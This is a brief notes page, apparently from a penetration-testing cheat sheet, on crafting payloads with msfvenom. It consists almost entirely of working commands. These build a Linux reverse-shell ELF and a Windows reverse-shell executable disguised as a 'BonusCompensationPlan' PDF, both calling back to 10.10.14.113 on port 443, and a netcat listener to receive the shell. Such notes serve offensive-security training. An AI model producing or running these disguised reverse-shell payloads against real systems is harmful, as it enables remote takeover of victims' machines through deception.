---
layout:
  title:
    visible: false
  description:
    visible: false
  tableOfContents:
    visible: false
  outline:
    visible: false
  pagination:
    visible: false
---

# Crafting Payloads with MSFvenom

list all the available payloads

```
msfvenom -l payloads
```

### Building A Stageless Payload

Build It

{% code fullWidth="true" %}
```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf
```
{% endcode %}

NC Connection

```
sudo nc -lvnp 443
```

### Building a simple Stageless Payload for a Windows system

{% code fullWidth="true" %}
```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > BonusCompensationPlanpdf.exe
```
{% endcode %}

